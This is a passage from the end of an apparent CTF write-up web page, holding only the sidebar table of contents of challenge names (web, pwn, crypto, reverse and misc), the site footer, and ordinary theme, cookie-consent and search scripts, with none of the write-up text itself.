is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1</span><span class="level-item">Web</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">ez_note</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">HTML practice</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">fxxkcors</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.4</span><span class="level-item">rubbish maker</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.4.1</span><span class="level-item">Statement</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.4.2</span><span class="level-item">Deobfuscation</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.4.3</span><span class="level-item">Manual labor :)</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.5</span><span class="level-item">baby gadget v1.0</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.6</span><span class="level-item">baby gadget v1.0’s rrrevenge</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.7</span><span class="level-item">baby gadget v2.0</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">1.8</span><span class="level-item">baby gadget v2.0’ revenge</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2</span><span class="level-item">Misc</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">Checkin</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">ra2</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">Tanner</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2.4</span><span class="level-item">AUDIO</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2.5</span><span class="level-item">misound</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">2.5.1</span><span class="level-item">非预期</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3</span><span class="level-item">Pwn</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">rain</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">happytree</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3.3</span><span class="level-item">kqueue</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3.3.1</span><span class="level-item">非预期</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3.4</span><span class="level-item">kqueue’s revenge</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3.5</span><span class="level-item">mujs</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3.5.1</span><span class="level-item">题目描述</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3.5.2</span><span class="level-item">寻找漏洞点</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3.5.3</span><span class="level-item">利用漏洞</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">3.5.4</span><span class="level-item">最终exp</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4</span><span class="level-item">Crypto</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">large case</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4.2</span><span class="level-item">InverseProblem</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4.3</span><span class="level-item">SpecialCurve3</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">4.4</span><span class="level-item">Ez_Pager_Tiper</span></span></a></li></ul></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">5</span><span class="level-item">Rev</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">5.1</span><span class="level-item">DigitalCircuits</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">5.2</span><span class="level-item">tttree</span></span></a></li><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">5.3</span><span class="level-item">hell_world</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#"><span class="level-left"><span class="level-item">5.3.1</span><span class="level-item">exp</span></span></a></li></ul></li></ul></li></ul></div></div><script src="/js/toc.js" defer></script></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>